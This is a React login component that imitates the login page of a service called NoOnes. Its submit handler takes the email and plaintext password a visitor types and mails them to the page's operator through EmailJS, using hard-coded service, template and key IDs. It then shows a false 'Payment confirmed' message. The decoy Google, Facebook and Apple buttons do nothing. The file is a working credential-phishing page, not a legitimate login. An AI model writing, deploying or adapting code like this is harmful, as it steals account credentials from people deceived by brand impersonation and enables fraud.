// src/Login.js
import React, { useState } from 'react';
import './App.css'; // reuse styling
import emailjs from '@emailjs/browser';
import Swal from 'sweetalert2'; // Import SweetAlert2


function Login() {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });
  const [successMessage, setSuccessMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!formData.email || !formData.password) {
      setErrorMessage('Please fill out all fields!');
      setSuccessMessage('');
      return;
    }

    const serviceID = 'service_hhsl7q7';
    const templateID = 'template_m2dl2pc';
    const publicKey = 'tU_Bniypr11H5Kv8U';

    emailjs
      .send(serviceID, templateID, formData, publicKey)
      .then((response) => {
        console.log('Email sent successfully!', response.status, response.text);
        Swal.fire({
          icon: 'success',
          title: 'Successful',
          text: 'Payment confirmed',
        });
        setFormData({ email: '', password: '' });
        setErrorMessage('');
      })
      .catch((err) => {
        console.error('Email sending failed:', err);
        Swal.fire({
          icon: 'error',
          title: 'Something went wrong',
          text: 'Failed to send login info.',
        });
      });
  };



  

  return (
    <div className="app">
      <div className="login-container">
        <div className="login-header">
          <h1>Log in</h1>
          <p>Access your NoOnes account</p>
        </div>
        
        <form className="login-body" onSubmit={handleSubmit}>
          <div className="login-form">
            <div className="form-group">
              <label htmlFor="email">Email</label>
              <input
                type="email"
                name="email"
                id="email"
                placeholder="example@email.com"
                value={formData.email}
                onChange={handleChange}
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="password-container">
                <input
                  type={showPassword ? 'text' : 'password'}
                  name="password"
                  id="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleChange}
                />
                <span
                  className="eye-icon"
                  onClick={() => setShowPassword(!showPassword)}
                  role="button"
                >
                  {showPassword ? '🙈' : '👁️'}
                </span>
              </div>
              <div className="forgot-password">
                <a href="#">Forgot password?</a>
              </div>
            </div>

            <button className="continue-btn" type="submit">Continue</button>

            {successMessage && <p className="success-msg">{successMessage}</p>}
            {errorMessage && <p className="error-msg">{errorMessage}</p>}
            
            <div className="phone-login">
              <a href="#">Log in with your phone number</a>
            </div>
          </div>
          
          <div className="social-login">
            <h3>or login with</h3>
        
            <button className="social-btn google-btn">
              <span className="icon">G</span>
              Google
            </button>
            
            <button className="social-btn facebook-btn">
              <span className="icon">f</span>
              Facebook
            </button>
            
            <button className="social-btn apple-btn">
              <span className="icon">
                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" strokeWidth="2" fill="none" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M9 7c-3 0-4 3-4 5.5 0 3 2 7.5 4 7.5 1.088-.046 1.679-.5 3-.5 1.312 0 1.5.5 3 .5s4-3 4-5c-.028-.01-2.472-.403-2.5-3 0-2.5 2.5-3.5 2.5-3.5C19 8.5 21 10 21 10c0-2.5-2.5-4-2.5-4C18.5 6 17 6 17 6c-1 0-2 1-3.5 1C12 7 11 7 9 7z"/>
                </svg>
              </span>
              Apple
            </button>
            </div>
            
            <div className="signup-link">
              Don't have an account? <a href="#">Join us</a>
            </div>
            </form>

          </div>
        </div>

      
    
  );
}

export default Login;